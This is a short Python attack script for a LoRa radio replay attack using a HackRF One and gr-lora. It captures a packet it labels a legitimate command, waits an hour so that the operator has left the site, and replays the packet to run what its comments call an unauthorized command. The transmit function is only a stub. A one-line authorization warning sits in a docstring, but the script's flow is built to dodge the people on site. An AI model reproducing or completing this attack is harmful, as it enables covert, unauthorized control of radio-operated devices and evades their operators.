#!/usr/bin/env python3
"""
LoRa packet capture and replay
Requires: HackRF One, gr-lora
"""

import socket
import time

def capture_lora_packet():
    """
    Capture LoRa packet using gr-lora
    Returns raw payload
    """
    # Assumes gr-lora is running and outputting to UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("127.0.0.1", 40868))

    print("[*] Listening for LoRa packets...")
    data, addr = sock.recvfrom(1024)

    print(f"[+] Captured LoRa packet: {data.hex()}")
    return data

def replay_lora_packet(payload):
    """
    Replay LoRa packet
    WARNING: Requires authorization
    """
    # Use HackRF with gr-lora transmit flowgraph
    # Transmit payload on same frequency/SF/BW
    print(f"[*] Replaying packet: {payload.hex()}")
    # Implementation via GNU Radio flowgraph

# Capture legitimate command packet
packet = capture_lora_packet()

# Wait for opportune moment (e.g., operator leaves site)
time.sleep(3600)

# Replay (execute unauthorized command)
replay_lora_packet(packet)
